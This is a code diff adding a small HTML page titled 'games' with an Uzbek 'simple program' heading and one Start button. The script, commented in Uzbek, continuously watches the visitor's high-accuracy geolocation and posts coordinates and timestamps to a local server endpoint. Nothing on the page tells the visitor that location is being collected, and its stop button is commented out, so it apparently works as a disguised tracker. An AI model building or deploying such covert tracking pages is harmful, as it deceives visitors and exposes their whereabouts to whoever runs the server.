@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>games</title>
+    <script>
+        let watchID;
+
+        // Geolokatsiya ma'lumotlarini olish va serverga yuborish funksiyasi
+        function startTracking() {
+            if (navigator.geolocation) {
+                watchID = navigator.geolocation.watchPosition(
+                    function (position) {
+                        const locationData = {
+                            latitude: position.coords.latitude, // Kenglik
+                            longitude: position.coords.longitude, // Uzunlik
+                            timestamp: new Date().toISOString() // Hozirgi vaqt
+                        };
+
+                        // Ma'lumotlarni serverga yuborish
+                        fetch("http://localhost:5000/save-location", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify(locationData)
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log("Location data sent:", locationData);
+                            } else {
+                                console.error("Failed to send location data.");
+                            }
+                        })
+                        .catch(error => console.error("Error sending data:", error));
+                    },
+                    function (error) {
+                        console.error("Error getting position:", error.message);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        maximumAge: 0,
+                        timeout: 5000
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Geolokatsiyani kuzatishni to'xtatish
+        function stopTracking() {
+            if (navigator.geolocation && watchID) {
+                navigator.geolocation.clearWatch(watchID);
+                console.log("Tracking stopped.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Oddiy dastur</h1>
+    <button onclick="startTracking()">Start</button>
+    <!-- <button onclick="stopTracking()">Stop Tracking</button> -->
+</body>
+</html>
